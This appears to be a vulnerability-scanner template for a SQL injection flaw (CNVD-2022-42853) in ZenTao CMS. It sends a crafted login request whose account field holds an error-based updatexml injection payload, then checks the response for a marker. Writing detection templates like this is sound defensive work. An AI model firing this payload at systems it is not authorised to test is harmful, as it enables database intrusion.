id: CNVD-2022-42853
brief:
    title: ZenTao CMS - SQL Injection
    by: ling
    level: critical
    about: ZenTao CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the cont...
    label:
        - cnvd
        - cnvd2022
        - zentao
        - sqli
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/zentao/user-login.html'
      head:
        Content-Type: application/x-www-form-urlencoded
        Referer: '{{BaseURL}}/zentao/user-login.html'
      body: account=admin'+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+'1'='1
      signs:
        - "on": word
          has:
            - c8c605999f3d8352d7bb792cf3fdb25
          in: body
